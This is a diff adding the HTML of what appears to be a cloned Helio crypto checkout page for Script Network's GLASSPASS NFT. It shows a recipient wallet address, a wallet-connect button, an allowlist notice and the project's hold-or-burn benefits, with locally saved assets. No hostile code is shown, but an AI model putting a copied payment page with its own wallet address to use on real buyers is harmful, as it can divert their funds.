+                        d="M21.9281 13.3334C22.2503 13.6621 22.2451 14.1897 21.9164 14.5119L17.6664 18.6786C17.3571 18.9818 16.867 18.9975 16.5389 18.7147L14.1222 16.6313C13.7737 16.3308 13.7347 15.8046 14.0352 15.456C14.3357 15.1075 14.8619 15.0685 15.2105 15.369L17.0468 16.952L20.7496 13.3218C21.0783 12.9996 21.6059 13.0048 21.9281 13.3334Z"
+                        fill="url(#paint2_linear_10567_409597)"></path>
+                      <defs>
+                        <filter id="filter0_d_10567_409597" x="0.670898" y="0.670898" width="34.6582" height="34.6582"
+                          filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+                          <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
+                          <feColorMatrix in="SourceAlpha" type="matrix"
+                            values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></feColorMatrix>
+                          <feOffset dy="2"></feOffset>
+                          <feGaussianBlur stdDeviation="2"></feGaussianBlur>
+                          <feComposite in2="hardAlpha" operator="out"></feComposite>
+                          <feColorMatrix type="matrix"
+                            values="0 0 0 0 0.968627 0 0 0 0 0.423529 0 0 0 0 0.105882 0 0 0 0.2 0"></feColorMatrix>
+                          <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_10567_409597">
+                          </feBlend>
+                          <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_10567_409597"
+                            result="shape"></feBlend>
+                        </filter>
+                        <linearGradient id="paint0_linear_10567_409597" x1="32" y1="55.6667" x2="-8.0536" y2="61.5582"
+                          gradientUnits="userSpaceOnUse">
+                          <stop stop-color="#F76C1B"></stop>
+                          <stop offset="1" stop-color="#DC1FFF"></stop>
+                        </linearGradient>
+                        <linearGradient id="paint1_linear_10567_409597" x1="9.6665" y1="16.0013" x2="26.3332"
+                          y2="16.0013" gradientUnits="userSpaceOnUse">
+                          <stop stop-color="#D8D9F5"></stop>
+                          <stop offset="0.262357" stop-color="#FEEEF2"></stop>
+                          <stop offset="0.624662" stop-color="#FEEDE3"></stop>
+                          <stop offset="1" stop-color="#F5FFFA"></stop>
+                        </linearGradient>
+                        <linearGradient id="paint2_linear_10567_409597" x1="13.833" y1="16.0006" x2="22.1664"
+                          y2="16.0006" gradientUnits="userSpaceOnUse">
+                          <stop stop-color="#D8D9F5"></stop>
+                          <stop offset="0.262357" stop-color="#FEEEF2"></stop>
+                          <stop offset="0.624662" stop-color="#FEEDE3"></stop>
+                          <stop offset="1" stop-color="#F5FFFA"></stop>
+                        </linearGradient>
+                      </defs>
+                    </svg></div>
+                  <p>Verified</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex w-full flex-col items-end gap-y-4"></div>
+      </div>
+      <div class="flex flex-col items-start gap-y-4 md:flex-row md:gap-x-4">
+        <div class="styles__ParentContainer-sc-12yv8tr-2 bnzddx">
+          <div
+            class="helio-background-container helio-text-body helio-shadow-default rounded-lg flex w-full flex-col gap-y-5 p-8 md:mb-20">
+            <div class="
+  h-full w-full rounded py-2
+  helio-background-gradient-candy
+">
+              <div class="styles__ImageContainer-sc-12yv8tr-0 iEcJKR">
+                <div><img alt="Helio checkout payments" loading="lazy" decoding="async" data-nimg="fill"
+                    class="transition-all duration-200 object-contain" sizes="100vw"
+                    srcset="IQlmF4jotEHeupJhEZ0m73x2bZCENI3mqzYAGK2i.gif 640w, IQlmF4jotEHeupJhEZ0m73x2bZCENI3mqzYAGK2i.gif 750w, IQlmF4jotEHeupJhEZ0m73x2bZCENI3mqzYAGK2i.gif 828w, IQlmF4jotEHeupJhEZ0m73x2bZCENI3mqzYAGK2i.gif 1080w, IQlmF4jotEHeupJhEZ0m73x2bZCENI3mqzYAGK2i.gif 1200w, IQlmF4jotEHeupJhEZ0m73x2bZCENI3mqzYAGK2i.gif 1920w, IQlmF4jotEHeupJhEZ0m73x2bZCENI3mqzYAGK2i.gif 2048w, IQlmF4jotEHeupJhEZ0m73x2bZCENI3mqzYAGK2i.gif 3840w"
+                    src="IQlmF4jotEHeupJhEZ0m73x2bZCENI3mqzYAGK2i.gif"
+                    style="position: absolute; height: 100%; width: 100%; inset: 0px; color: transparent;"></div>
+              </div>
+            </div>
+            <div class="styles__PaymentDetailsParentContainer-sc-12yv8tr-9 cJNoyC">
+              <div class="styles__PaymentDetailsContanier-sc-12yv8tr-8 dTmhXC">
+                <div class="styles__PaymentDetailsRow-sc-12yv8tr-7 kCqcQ">
+                  <div class="styles__TransparentWalletAndTwitterContainer-sc-12yv8tr-6 dQGkxB">
+                    <p class="styles__TransparentWalletText-sc-t853ue-0 kMwGIE">Recipient: <a target="_blank"
+                        rel="noopener noreferrer"
+                        href="https://etherscan.io/address/0x700CB9372bd4410e7C9743235253061A376c823b"
+                        class="cursor-pointer helio-text-highest-contrast@hover font-bold underline">0x700C..23b</a></p>
+                  </div>
+                  <div>
+                    <div><a href="https://twitter.com/script_network" target="_blank" rel="noreferrer"
+                        class="styles__StyledAnchor-sc-3somab-0 krEsBK">
+                        <div class="flex items-center justify-center gap-x-1">
+                          <div class="h-5 w-5 fill-[#1D9BF0]"><svg viewBox="0 0 24 24"
+                              xmlns="http://www.w3.org/2000/svg">
+                              <path
+                                d="M22.25 12C22.25 10.57 21.37 9.33 20.06 8.66C20.52 7.27 20.26 5.76 19.25 4.75C18.24 3.74 16.73 3.48 15.34 3.94C14.68 2.63 13.43 1.75 12 1.75C10.57 1.75 9.33 2.63 8.67 3.94C7.27 3.48 5.76 3.74 4.75 4.75C3.74 5.76 3.49 7.27 3.95 8.66C2.64 9.33 1.75 10.57 1.75 12C1.75 13.43 2.64 14.67 3.95 15.34C3.49 16.73 3.74 18.24 4.75 19.25C5.76 20.26 7.27 20.51 8.66 20.06C9.33 21.37 10.57 22.25 12 22.25C13.43 22.25 14.68 21.37 15.34 20.06C16.73 20.51 18.24 20.26 19.25 19.25C20.26 18.24 20.52 16.73 20.06 15.34C21.37 14.67 22.25 13.43 22.25 12ZM10.54 16.2L6.8 12.46L8.21 11.04L10.47 13.3L15.27 8.07L16.74 9.43L10.54 16.2Z">
+                              </path>
+                            </svg></div>
+                          <p>Twitter linked</p>
+                        </div>
+                      </a></div>
+                  </div>
+                </div>
+                <div class="styles__PaymentDetailsContainer-sc-12yv8tr-4 fcLKqE">
+                  <div>
+                    <h2>GLASSPASS from Script Network </h2>
+                    <h4 class="styles__PriceText-sc-12yv8tr-5 ekyFDK">0.04 ETH</h4>
+                  </div><a
+                    href="https://twitter.com/intent/tweet?text=I%20just%20made%20a%20purchase%20from%20@script_network%20using%20@helio_pay%20%F0%9F%94%A5%20%0ahttps://www.hel.io/pay/6501e447e9766d01ac4b2ab6"
+                    target="_blank" rel="noreferrer" class="styles__TwitterShareLink-sc-12yv8tr-3 gRkwAF">
+                    <p>Share on</p>
+                    <div class="helio-fill-primary helio-fill-link@hover h-6 w-6 cursor-pointer"><svg width="24"
+                        height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM18.3655 9.6664C18.3655 9.52422 18.3655 9.38201 18.3554 9.23983C18.995 8.77262 19.5534 8.19373 20 7.54376C19.4112 7.79764 18.7716 7.98049 18.1117 8.05155C18.7919 7.64533 19.3096 7.00549 19.5533 6.24375C18.9238 6.61952 18.2132 6.89376 17.4721 7.03594C16.8731 6.39609 16.0203 6 15.0761 6C13.2589 6 11.7969 7.47264 11.7969 9.28047C11.7969 9.53438 11.8274 9.78827 11.8782 10.032C9.15736 9.8898 6.73095 8.58983 5.11672 6.5992C4.83244 7.08671 4.67003 7.6453 4.67003 8.25466C4.67003 9.39217 5.24869 10.3976 6.13195 10.9867C5.59391 10.9664 5.08625 10.8141 4.64972 10.5703V10.6109C4.64972 12.2055 5.77666 13.5258 7.2792 13.8305C7.00511 13.9015 6.71067 13.9422 6.41626 13.9422C6.20304 13.9422 6.00001 13.9219 5.79694 13.8914C6.2132 15.1914 7.42133 16.1359 8.86296 16.1664C7.73605 17.05 6.32485 17.568 4.79188 17.568C4.51775 17.568 4.26397 17.5578 4 17.5274C5.45179 18.4617 7.17767 19 9.03555 19C15.066 19 18.3655 14.0031 18.3655 9.6664Z">
+                        </path>
+                      </svg></div>
+                  </a>
+                </div>
+              </div>
+            </div>
+            <p class="styles__DescriptionText-sc-12yv8tr-1 dmWmte">
+            <div class="styles__StyledWrapper-sc-1323uda-0 gpKcQe styled-content">
+              <div class="styles__StyledWrapper-sc-1323uda-0 gpKcQe styled-content">
+                <h2>What is GLASSPASS?</h2>
+                <p>GLASSPASS is a limited NFT collection featuring just 1500 passes. The artwork and metadata (besides
+                  token id of course), is identical, with none f the passes being more rare or common than each other.
+                  The point of GLASSPASS therefore is not to own one to hang on your wall, but rather, to own one as a
+                  pure utility asset.</p>
+                <p><img src="1_LkCTmowRjS5_Oqej3gh3NQ.webp" alt=""></p>
+                <h3><strong>HOLD OR BURN?</strong></h3>
+                <p>The big question is once you mint your pass, do you hold, or do you burn it? To clarify, here is the
+                  options available.</p>
+                <p><strong>HOLD:</strong>
+                  By holding, you get the following benefits:
+                  $SCPT Airdrop
+                  $SCPT Ad Revenue Profit Share
+                  Free offline ticket raffles (Cinema, Festivals)
+                  Beta access to product launches
+                  Exclusive Content
+                  Owning an asset with a deflationary supply</p>
+                <p><strong>BURN:</strong>
+                  By burning, you get the following benefits:
+                  Get Superscript Glasses (the most exclusive, rarest pair of glasses)
+                  Own a rare tradeable asset (Superscript Glasses)
+                  Earn the maximum amount per day in $SPAY tokens through holding
+                  Superscript Glasses holders get branded drops from global partners.</p>
+                <p>You can learn more about GLASSPASS in detail, here;
+                  <a href="https://www.example.com/"
+                    target="_blank">https://medium.com/script-network/glasspass-rewards-reveal-airdrop-ad-revenue-profit-sharing-and-minting-information-319a8dc82a31</a>
+                </p>
+              </div>
+            </div>
+            </p><button type="button"
+              class="styles__StyledContainer-sc-1q7bbfv-1 fgYsxp h-[24px] w-fit px-2 normal-case"><span
+                class="text-xs font-normal">Report link</span></button>
+          </div>
+        </div>
+        <div class="flex h-fit w-full flex-col overflow-visible md:w-1/3">
+          <div class="helio-background-container helio-text-body helio-shadow-default rounded-lg overflow-visible">
+            <div>
+              <div class="rounded-t-lg py-1 helio-background-gradient-candy"></div>
+              <div class="styles__StyledContainer-sc-3fc2xg-0 djIHUd">
+                <div class="styles__StyledFlexGrid-sc-3fc2xg-1 dMmSQm">
+                  <div class="relative h-6 w-6 overflow-hidden rounded-full">
+                    <div><img alt="ETH" loading="lazy" decoding="async" data-nimg="fill"
+                        class="transition-all duration-200" sizes="100vw"
+                        srcset="ETH.svg 640w, ETH-1.svg 750w, ETH-2.svg 828w, ETH-3.svg 1080w, ETH-4.svg 1200w, ETH-5.svg 1920w, ETH-6.svg 2048w, ETH-7.svg 3840w"
+                        src="ETH-7.svg"
+                        style="position: absolute; height: 100%; width: 100%; inset: 0px; color: transparent;"></div>
+                  </div>
+                  <h4 class="styles__StyledHeader-sc-3fc2xg-2 bRsECr">Pay with ETH</h4>
+                </div>
+              </div>
+              <div class="p-6">
+                <div></div>
+                <form action="#">
+                  <div class="flex flex-col gap-y-3">
+                    <div class="styles__StyledParentContainer-sc-181dv4a-0 dpUDOM">
+                      <div class="styles__StyledFlexContainer-sc-181dv4a-1 hJoYWE">
+                        <div class="w-full text-sm">
+                          <div class="inline">Total Price: </div>
+                          <div class="inline font-bold">0.04 ETH</div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="style__StyledContainer-sc-inlw5y-2 hzMMUE">
+                      <div class="p-4 rounded-lg helio-background-secondary">
+                        <div class="h-6 w-6 helio-fill-primary"><svg viewBox="0 0 24 24"
+                            xmlns="http://www.w3.org/2000/svg">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M4 11C4 10.4477 4.44772 10 5 10H19C19.5523 10 20 10.4477 20 11V21C20 21.5523 19.5523 22 19 22H5C4.44772 22 4 21.5523 4 21V11ZM6 12V20H18V12H6Z">
+                            </path>
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M7 7C7 4.24772 9.24772 2 12 2C14.7523 2 17 4.24772 17 7V11C17 11.5523 16.5523 12 16 12C15.4477 12 15 11.5523 15 11V7C15 5.35228 13.6477 4 12 4C10.3523 4 9 5.35228 9 7V11C9 11.5523 8.55228 12 8 12C7.44772 12 7 11.5523 7 11V7Z">
+                            </path>
+                            <path
+                              d="M12 16.5C12.8284 16.5 13.5 15.8284 13.5 15C13.5 14.1716 12.8284 13.5 12 13.5C11.1716 13.5 10.5 14.1716 10.5 15C10.5 15.8284 11.1716 16.5 12 16.5Z">
+                            </path>
+                            <path
+                              d="M12.3 18.5H11.7C11.3 18.5 11 18.2 11 17.8V16.2C11 15.8 11.3 15.5 11.7 15.5H12.3C12.7 15.5 13 15.8 13 16.2V17.8C13 18.2 12.7 18.5 12.3 18.5Z">
+                            </path>
+                          </svg></div>
+                      </div>
+                      <div class="style__StyledColumn-sc-inlw5y-3 hfaXuf">
+                        <div class="text-sm helio-text-display font-bold">Allowlist only access.</div>
+                        <div class="style__StyledText-sc-inlw5y-4 gqHyVf">This payment is locked to a list of
+                          pre-approved wallet addresses.</div>
+                      </div>
+                    </div>
+                    <div class="relative"><label><button type="button"
+                          class="styles__StyledContainer-sc-1q7bbfv-1 jTXbXR connect___StyledButton-sc-l518k5-0 lgkkVs"><span
+                            class="text-sm font-bold"><span class="rounded-full" id="connect_button">CONNECT
+                              WALLET</span></span></button></label></div>
+                  </div>
+                </form>
+                <div class="styles__StyledAccessCardFooter-sc-1qvmkuk-0 hFvFgb">
+                  <div class="flex items-center justify-center gap-2 flex-wrap">
+                    <div title="Ethereum">
+                      <div class="h-4 w-4"><svg width="16" height="16" viewBox="0 0 16 16" fill="none"
+                          xmlns="http://www.w3.org/2000/svg">
+                          <g clip-path="url(#clip0_5_16184)">
+                            <circle cx="8" cy="8" r="8" fill="white"></circle>
+                            <path
+                              d="M12.048 1.08809C10.7895 0.362696 9.44011 0 8 0C6.54922 0 5.20521 0.362696 3.96797 1.08809C2.77344 1.8028 1.81348 2.76276 1.08809 3.96797C0.362696 5.20521 0 6.54922 0 8C0 9.44011 0.362696 10.7895 1.08809 12.048C1.81348 13.2533 2.77344 14.2079 3.96797 14.9119C5.20521 15.6373 6.54922 16 8 16C9.44011 16 10.7895 15.6373 12.048 14.9119C13.2533 14.2079 14.2079 13.2533 14.9119 12.048C15.6373 10.7895 16 9.44011 16 8C16 6.54922 15.6373 5.20521 14.9119 3.96797C14.2079 2.77344 13.2533 1.81348 12.048 1.08809ZM7.9039 2.72022V6.54404L4.81582 7.88789L7.9039 2.72022ZM8.11211 6.54404V2.72022L11.2322 7.9044L8.11211 6.54404ZM7.9039 6.76777V10.0315L4.71972 8.15966L7.9039 6.76777ZM11.2958 8.16016L8.11161 10.032V6.76827L11.2958 8.16016ZM7.9039 10.6882V13.3123L4.73574 8.83233L7.9039 10.6882ZM11.2643 8.83183L8.11211 13.3118V10.6877L11.2643 8.83183Z"
+                              fill="#5A6578"></path>
+                            <circle cx="8" cy="8" r="8" fill="url(#paint0_linear_5_16185)" fill-opacity="0.2"></circle>
+                          </g>
+                          <defs>
+                            <linearGradient id="paint0_linear_5_16185" x1="8" y1="0" x2="8" y2="16"
+                              gradientUnits="userSpaceOnUse">
+                              <stop stop-color="white"></stop>
+                              <stop offset="1" stop-color="white" stop-opacity="0"></stop>
+                            </linearGradient>
+                            <clipPath id="clip0_5_16185">
+                              <rect width="16" height="16" fill="white"></rect>
+                            </clipPath>
+                          </defs>
+                        </svg></div>
+                    </div>
+                  </div>
+                  <div class="mr-0 ml-auto py-[3px] px-2 sm:flex gap-x-1 
+  hidden w-fit cursor-pointer flex-row items-center rounded-lg 
+  helio-background-secondary helio-background-secondary-alternative@hover">
+                    <p class="styles__StyledText-sc-1h4zp-0 jgEplw">Pay with QR</p>
+                    <div class="helio-fill-primary h-4 w-4"><svg viewBox="0 0 16 16" fill="none"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path
+                          d="M6.66663 7.33334H3.33329C2.93329 7.33334 2.66663 7.06667 2.66663 6.66667V3.33334C2.66663 2.93334 2.93329 2.66667 3.33329 2.66667H6.66663C7.06663 2.66667 7.33329 2.93334 7.33329 3.33334V6.66667C7.33329 7.06667 7.06663 7.33334 6.66663 7.33334ZM3.99996 6.00001H5.99996V4.00001H3.99996V6.00001Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M6.66663 13.3333H3.33329C2.93329 13.3333 2.66663 13.0667 2.66663 12.6667V9.33334C2.66663 8.93334 2.93329 8.66667 3.33329 8.66667H6.66663C7.06663 8.66667 7.33329 8.93334 7.33329 9.33334V12.6667C7.33329 13.0667 7.06663 13.3333 6.66663 13.3333ZM3.99996 12H5.99996V10H3.99996V12Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M12.6666 7.33334H9.33329C8.93329 7.33334 8.66663 7.06667 8.66663 6.66667V3.33334C8.66663 2.93334 8.93329 2.66667 9.33329 2.66667H12.6666C13.0666 2.66667 13.3333 2.93334 13.3333 3.33334V6.66667C13.3333 7.06667 13.0666 7.33334 12.6666 7.33334ZM9.99996 6.00001H12V4.00001H9.99996V6.00001Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M9.33329 10C9.13329 10 8.99996 9.93334 8.86663 9.8C8.79996 9.73334 8.73329 9.66667 8.73329 9.6C8.73329 9.53334 8.66663 9.4 8.66663 9.33334C8.66663 9.13334 8.73329 9.00001 8.86663 8.86667C8.99996 8.73334 9.26663 8.66667 9.46663 8.66667C9.53329 8.66667 9.53329 8.66667 9.59996 8.73334C9.66663 8.73334 9.66663 8.73334 9.73329 8.8C9.79996 8.8 9.79996 8.86667 9.86663 8.86667C9.93329 8.93334 9.99996 9.00001 9.99996 9.06667C9.99996 9.13334 10.0666 9.26667 10.0666 9.33334C10.0666 9.4 10.0666 9.53334 9.99996 9.6C9.93329 9.66667 9.93329 9.73334 9.86663 9.8C9.79996 9.86667 9.73329 9.93334 9.66663 9.93334C9.59996 9.93334 9.39996 10 9.33329 10Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M10.6666 12C10.4666 12 10.3333 11.9333 10.1999 11.8C10.1333 11.7333 10.0666 11.6667 10.0666 11.6C10.0666 11.5333 9.99994 11.4 9.99994 11.3333C9.99994 11.1333 10.0666 11 10.1999 10.8667C10.3999 10.6667 10.6666 10.6 10.9333 10.7333C10.9999 10.7333 11.0666 10.8 11.1333 10.8667C11.1999 10.9333 11.2666 11 11.2666 11.0667C11.2666 11.1333 11.3333 11.2667 11.3333 11.3333C11.3333 11.4 11.3333 11.5333 11.2666 11.6C11.1999 11.6667 11.1999 11.7333 11.1333 11.8C10.9999 11.9333 10.8666 12 10.6666 12Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M12.6666 10C12.5999 10 12.4666 10 12.3999 9.93334C12.3333 9.86668 12.2666 9.86668 12.1999 9.80001C12.1333 9.73334 12.0666 9.66668 12.0666 9.60001C12.0666 9.53334 11.9999 9.40001 11.9999 9.33334C11.9999 9.26668 11.9999 9.13334 12.0666 9.06668C12.0666 9.00001 12.1333 8.93334 12.1999 8.86668L12.2666 8.80001C12.3333 8.80001 12.3333 8.73334 12.3999 8.73334C12.4666 8.73334 12.4666 8.66668 12.5333 8.66668C12.7333 8.60001 12.9999 8.66668 13.1333 8.86668C13.1999 8.93334 13.2666 9.00001 13.2666 9.06668C13.3333 9.13334 13.3333 9.26668 13.3333 9.33334C13.3333 9.40001 13.3333 9.53334 13.2666 9.60001C13.2666 9.66668 13.1999 9.73334 13.1333 9.80001C12.9999 9.93334 12.8666 10 12.6666 10Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M12.6666 12H12C11.6 12 11.3333 11.7333 11.3333 11.3333C11.3333 10.9333 11.6 10.6667 12 10.6667H12.6666C13.0666 10.6667 13.3333 10.9333 13.3333 11.3333C13.3333 11.7333 13.0666 12 12.6666 12Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M9.33329 13.3333C9.13329 13.3333 8.99996 13.2667 8.86663 13.1333C8.79996 13.0667 8.73329 13 8.73329 12.9333C8.73329 12.8667 8.66663 12.7333 8.66663 12.6667C8.66663 12.4667 8.73329 12.3333 8.86663 12.2C8.99996 12.0667 9.26663 12 9.46663 12C9.53329 12 9.53329 12 9.59996 12.0667C9.66663 12.0667 9.66663 12.0667 9.73329 12.1333C9.79996 12.1333 9.79996 12.2 9.86663 12.2C9.93329 12.2667 9.99996 12.3333 9.99996 12.4C9.99996 12.4667 10.0666 12.6 10.0666 12.6667C10.0666 12.7333 10.0666 12.8667 9.99996 12.9333C9.93329 13 9.93329 13.0667 9.86663 13.1333C9.79996 13.2 9.73329 13.2667 9.66663 13.2667C9.59996 13.2667 9.39996 13.3333 9.33329 13.3333Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M11.3333 10H10.6666C10.2666 10 9.99994 9.73334 9.99994 9.33334C9.99994 8.93334 10.2666 8.66667 10.6666 8.66667H11.3333C11.7333 8.66667 11.9999 8.93334 11.9999 9.33334C11.9999 9.73334 11.7333 10 11.3333 10Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M1.99998 3.33334C1.59998 3.33334 1.33331 3.06667 1.33331 2.66667V1.33334C1.33331 0.933338 1.59998 0.666672 1.99998 0.666672H3.33331C3.73331 0.666672 3.99998 0.933338 3.99998 1.33334C3.99998 1.73334 3.73331 2.00001 3.33331 2.00001H2.66665V2.66667C2.66665 3.06667 2.39998 3.33334 1.99998 3.33334Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M14 3.33334C13.6 3.33334 13.3333 3.06667 13.3333 2.66667V2.00001H12.6667C12.2667 2.00001 12 1.73334 12 1.33334C12 0.933338 12.2667 0.666672 12.6667 0.666672H14C14.4 0.666672 14.6667 0.933338 14.6667 1.33334V2.66667C14.6667 3.06667 14.4 3.33334 14 3.33334Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M14 15.3333H12.6667C12.2667 15.3333 12 15.0667 12 14.6667C12 14.2667 12.2667 14 12.6667 14H13.3333V13.3333C13.3333 12.9333 13.6 12.6667 14 12.6667C14.4 12.6667 14.6667 12.9333 14.6667 13.3333V14.6667C14.6667 15.0667 14.4 15.3333 14 15.3333Z"
+                          fill="#F76C1B"></path>
+                        <path
+                          d="M3.33331 15.3333H1.99998C1.59998 15.3333 1.33331 15.0667 1.33331 14.6667V13.3333C1.33331 12.9333 1.59998 12.6667 1.99998 12.6667C2.39998 12.6667 2.66665 12.9333 2.66665 13.3333V14H3.33331C3.73331 14 3.99998 14.2667 3.99998 14.6667C3.99998 15.0667 3.73331 15.3333 3.33331 15.3333Z"
+                          fill="#F76C1B"></path>
+                      </svg></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="mt-6 mb-5 flex flex-col gap-y-3">
+            <p class="helio-text-low-contrast helio-background-checkout-footer rounded-lg py-1 px-2 text-xs"><b
+                class="font-bold">Disclaimer:</b> This is a DeFi payment that can't be reversed. Funds go directly to
+              the merchant. <a target="_blank" rel="noopener noreferrer"
+                href="https://info.docs.hel.io/terms-of-service"
+                class="cursor-pointer styledLink__StyledLinkWithColors-sc-8cspgm-0 gizPFD leading-2 underline underline-offset-2">See
+                our terms</a></p>
+            <div class="flex items-center justify-start gap-x-2">
+              <div class="flex gap-x-2"><a target="_blank" href="https://helio.co/"><svg width="1em" height="1em"
+                    viewBox="0 0 46 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-[16px] w-[45px]">
+                    <path
+                      d="M7.203 15.636v-6.49c0-1.48-.772-1.945-1.983-1.945a3.09 3.09 0 0 0-2.422 1.26v7.175H0V.91h2.798v5.454a4.921 4.921 0 0 1 3.744-1.657C8.876 4.706 10 5.986 10 8.063v7.573H7.203ZM17.232 15.818c-3.24 0-5.596-2.243-5.596-5.728s2.295-5.726 5.596-5.726c3.22 0 5.495 2.183 5.495 5.486.003.362-.024.724-.08 1.081h-8.152c.14 1.643 1.268 2.564 2.683 2.564 1.208 0 1.872-.6 2.235-1.335h3.039c-.604 2.036-2.456 3.658-5.22 3.658ZM14.515 9.05h5.3c-.04-1.462-1.208-2.383-2.657-2.383-1.348 0-2.415.861-2.637 2.383h-.006ZM24.182.91h2.727v14.726h-2.727V.91ZM28.727 1.636c0-.918.725-1.636 1.73-1.636 1.007 0 1.725.711 1.725 1.636 0 .924-.745 1.635-1.73 1.635-.987 0-1.725-.724-1.725-1.635Zm.302 2.952h2.817v11.048H29.03V4.588ZM42.57 9.818a3.306 3.306 0 0 0-6.602 0h-2.513a5.818 5.818 0 0 1 11.636 0h-2.522ZM39.395 16c-1.09 0-2.158-.31-3.08-.895a5.804 5.804 0 0 1-2.133-2.409l2.26-1.06a3.297 3.297 0 0 0 1.181 1.337 3.268 3.268 0 0 0 4.658-1.209l2.264 1.062a5.828 5.828 0 0 1-2.133 2.314 5.779 5.779 0 0 1-3.017.86Z"
+                      fill="#808B9D"></path>
+                  </svg></a></div>
+              <p class="helio-background-bold helio-text-button w-fit rounded-lg px-[5px] py-[2px] text-[11px]">Audited
+              </p><button
+                class="rounded-lg border border-l w-[32px] h-[20px] p-[2px] flex items-center cursor-pointer helio-always-allow-transitions helio-border-color bg-white"
+                aria-checked="false" role="checkbox">
+                <div
+                  class="w-[14px] h-[14px] rounded-lg flex items-center justify-center transition-all duration-300 helio-background-primary">
+                  <div class="flex h-full w-full items-center justify-center">
+                    <div class="flex h-full w-full items-center justify-center"><svg width="14" height="14"
+                        viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M6.99984 1.16663C7.322 1.16663 7.58317 1.42779 7.58317 1.74996V2.91663C7.58317 3.23879 7.322 3.49996 6.99984 3.49996C6.67767 3.49996 6.4165 3.23879 6.4165 2.91663V1.74996C6.4165 1.42779 6.67767 1.16663 6.99984 1.16663Z"
+                          fill="white"></path>
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M6.99984 10.5C7.322 10.5 7.58317 10.7612 7.58317 11.0833V12.25C7.58317 12.5722 7.322 12.8333 6.99984 12.8333C6.67767 12.8333 6.4165 12.5722 6.4165 12.25V11.0833C6.4165 10.7612 6.67767 10.5 6.99984 10.5Z"
+                          fill="white"></path>
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M1.1665 6.99996C1.1665 6.67779 1.42767 6.41663 1.74984 6.41663H2.9165C3.23867 6.41663 3.49984 6.67779 3.49984 6.99996C3.49984 7.32213 3.23867 7.58329 2.9165 7.58329H1.74984C1.42767 7.58329 1.1665 7.32213 1.1665 6.99996Z"
+                          fill="white"></path>
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.5 6.99996C10.5 6.67779 10.7612 6.41663 11.0833 6.41663H12.25C12.5722 6.41663 12.8333 6.67779 12.8333 6.99996C12.8333 7.32213 12.5722 7.58329 12.25 7.58329H11.0833C10.7612 7.58329 10.5 7.32213 10.5 6.99996Z"
+                          fill="white"></path>
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M4.55392 9.44576C4.78172 9.67356 4.78172 10.0429 4.55392 10.2707L3.67892 11.1457C3.45111 11.3735 3.08177 11.3735 2.85396 11.1457C2.62615 10.9179 2.62615 10.5486 2.85396 10.3208L3.72896 9.44576C3.95677 9.21795 4.32611 9.21795 4.55392 9.44576Z"
+                          fill="white"></path>
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M11.1457 2.8542C11.3735 3.08201 11.3735 3.45136 11.1457 3.67916L10.2707 4.55416C10.0429 4.78197 9.67356 4.78197 9.44576 4.55416C9.21795 4.32636 9.21795 3.95701 9.44576 3.7292L10.3208 2.8542C10.5486 2.6264 10.9179 2.6264 11.1457 2.8542Z"
+                          fill="white"></path>
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M2.85396 2.8542C3.08177 2.6264 3.45111 2.6264 3.67892 2.8542L4.55392 3.7292C4.78172 3.95701 4.78172 4.32636 4.55392 4.55416C4.32611 4.78197 3.95677 4.78197 3.72896 4.55416L2.85396 3.67916C2.62615 3.45136 2.62615 3.08201 2.85396 2.8542Z"
+                          fill="white"></path>
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M9.44576 9.44576C9.67356 9.21795 10.0429 9.21795 10.2707 9.44576L11.1457 10.3208C11.3735 10.5486 11.3735 10.9179 11.1457 11.1457C10.9179 11.3735 10.5486 11.3735 10.3208 11.1457L9.44576 10.2707C9.21795 10.0429 9.21795 9.67356 9.44576 9.44576Z"
+                          fill="white"></path>
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M7 5.54167C6.19458 5.54167 5.54167 6.19458 5.54167 7C5.54167 7.80542 6.19458 8.45833 7 8.45833C7.80542 8.45833 8.45833 7.80542 8.45833 7C8.45833 6.19458 7.80542 5.54167 7 5.54167ZM4.375 7C4.375 5.55025 5.55025 4.375 7 4.375C8.44975 4.375 9.625 5.55025 9.625 7C9.625 8.44975 8.44975 9.625 7 9.625C5.55025 9.625 4.375 8.44975 4.375 7Z"
+                          fill="white"></path>
+                      </svg></div>
+                  </div>
+                </div>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div style="position:fixed;z-index:9999;top:16px;left:16px;right:16px;bottom:16px;pointer-events:none"></div>
